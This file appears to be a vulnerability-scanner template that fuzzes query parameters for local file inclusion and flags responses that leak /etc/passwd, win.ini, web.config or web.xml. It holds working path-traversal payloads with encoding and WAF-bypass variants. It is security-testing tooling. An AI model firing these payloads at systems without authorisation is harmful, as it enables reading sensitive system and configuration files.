http:
- fuzzing:
  - fuzz:
    - '{{lfi}}'
    mode: single
    part: query
  - fuzz:
    - '{{lfi}}'
    mode: single
    part: query
    values:
    - ^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.jpeg|.gif)$
  matchers:
  - part: body
    regex:
    - 'root:.*?:[0-9]*:[0-9]*:'
    type: regex
  - part: body
    type: word
    words:
    - for 16-bit app support
  - part: body
    regex:
    - (<web-app[\s\S]+<\/web-app>)
    type: regex
  - part: body
    regex:
    - (<system.webServer[\s\S]+<\/system.webServer>)
    type: regex
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    lfi:
    - '{{fuzz}}etc/passwd'
    - '{{fuzz}}windows/win.ini'
    - /etc/passwd%00.jpg
    - c:/windows/win.ini%00.jpg
    - '{{fuzz}}etc/passwd%00.jpg'
    - '{{fuzz}}windows/win.ini%00.jpg'
    - '{{fuzz_urlx2_encode}}etc%252fpasswd'
    - '{{fuzz_urlx2_encode}}windows%252fwin.ini'
    - '{{fuzz_hex_unicode}}etc%u002fpasswd'
    - '{{fuzz_hex_unicode}}windows%u002fwin.ini'
    - '{{fuzz_utf8_unicode}}etc%C0%AFpasswd'
    - '{{fuzz_utf8_unicode}}windows%C0%AFwin.ini'
    - '{{fuzz_utf8_unicode_x}}etc%C0AFpasswd'
    - '{{fuzz_utf8_unicode_x}}windows%C0AFwin.ini'
    - '{{fuzz_bypass_replace}}etc/passwd'
    - '{{fuzz_bypass_replace}}windows/win.ini'
    - '{{fuzz_bypass_replace_windows}}windows\win.ini'
    - '{{fuzz_bypass_waf_regx}}etc/passwd'
    - '{{fuzz_bypass_waf_regx}}windows/win.ini'
    - ./web.config
    - ../web.config
    - ../../web.config
    - ./WEB-INF/web.xml
    - ../WEB-INF/web.xml
    - ../../WEB-INF/web.xml
  stop-at-first-match: true
id: lfi-keyed
info:
  author: pwnhxl
  name: Key LFI Detection
  reference:
  - https://owasp.org/www-community/attacks/Unicode_Encoding
  severity: high
  tags: fuzzing-lfi,fuzzing-req,dast
variables:
  fuzz: ../../../../../../../../../../../../../../../
  fuzz_bypass_replace: '.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../'
  fuzz_bypass_replace_windows: ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\
  fuzz_bypass_waf_regx: ./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../
  fuzz_hex_unicode: '%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f'
  fuzz_urlx2_encode: '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f'
  fuzz_utf8_unicode: '%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF'
  fuzz_utf8_unicode_x: '%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF'
